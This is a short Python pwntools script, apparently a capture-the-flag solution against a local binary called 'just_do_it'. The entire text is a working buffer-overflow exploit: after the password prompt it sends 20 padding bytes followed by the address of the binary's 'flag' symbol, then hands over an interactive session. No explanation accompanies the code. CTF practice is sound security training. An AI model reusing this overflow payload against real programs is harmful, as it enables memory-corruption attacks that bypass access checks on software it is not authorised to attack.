#!/usr/bin/python3

from pwn import *

#context.log_level = 'debug'
e = context.binary = ELF("/tmp/just_do_it", checksec=False)
p = process()

payload = b'A'*20 + p32(e.symbols['flag'])
p.sendafter(b" password.\n", payload)

p.interactive()
